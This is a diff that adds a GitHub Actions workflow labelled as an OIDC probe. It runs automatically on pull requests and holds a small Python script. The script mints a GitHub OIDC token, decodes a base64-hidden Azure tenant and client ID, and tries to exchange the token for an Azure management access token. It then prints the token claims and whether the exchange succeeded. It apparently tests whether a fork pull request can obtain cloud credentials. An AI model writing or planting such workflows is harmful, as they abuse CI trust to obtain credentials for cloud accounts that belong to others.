@@ -1,0 +1,35 @@
+name: c211-i80726-oidc-probe
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  oidc:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: mint and exchange
+        run: |
+          python3 - <<'PYEOF'
+          import json,base64,os,urllib.request,urllib.parse,urllib.error,re
+          P=json.loads(base64.b64decode("eyJ0IjoiMzk4YTY2NTQtOTk3Yi00N2U5LWIxMmItOTUxNWI4OTZiNGRlIiwiYyI6IjVhZDFhMTg4LWI5NDQtNDBlYi1hMmY4LWNjNjgzYTZhNjVhMCJ9"))
+          def mint():
+              u=os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']+'&audience='+urllib.parse.quote('api://AzureADTokenExchange',safe='')
+              r=urllib.request.Request(u,headers={'Authorization':'Bearer '+os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']})
+              return json.loads(urllib.request.urlopen(r,timeout=30).read())['value']
+          jwt=mint()
+          p=jwt.split('.')[1]; p+='='*(-len(p)%4)
+          cl=json.loads(base64.urlsafe_b64decode(p))
+          keep=('iss','aud','sub','repository','repository_owner','event_name','ref','environment','job_workflow_ref','base_ref','head_ref')
+          print('C211_I80726_FORK_CLAIMS', base64.b64encode(json.dumps({k:cl.get(k) for k in keep if k in cl},sort_keys=True).encode()).decode(), flush=True)
+          body=urllib.parse.urlencode({'grant_type':'client_credentials','client_id':P['c'],'scope':'https://management.azure.com/.default','client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer','client_assertion':jwt}).encode()
+          try:
+              req=urllib.request.Request('https://login.microsoftonline.com/'+P['t']+'/oauth2/v2.0/token',data=body,headers={'Content-Type':'application/x-www-form-urlencoded'})
+              with urllib.request.urlopen(req,timeout=25) as f:
+                  j=json.loads(f.read()); print('C211_I80726_FORK_RES', f.status, 'ARM' if j.get('access_token') else 'NO_TOKEN', flush=True)
+          except urllib.error.HTTPError as e:
+              raw=e.read().decode('utf-8','replace'); m=re.search(r'AADSTS\d+',raw)
+              print('C211_I80726_FORK_RES', e.code, m.group(0) if m else '?', raw[:200].replace('\n',' '), flush=True)
+          PYEOF
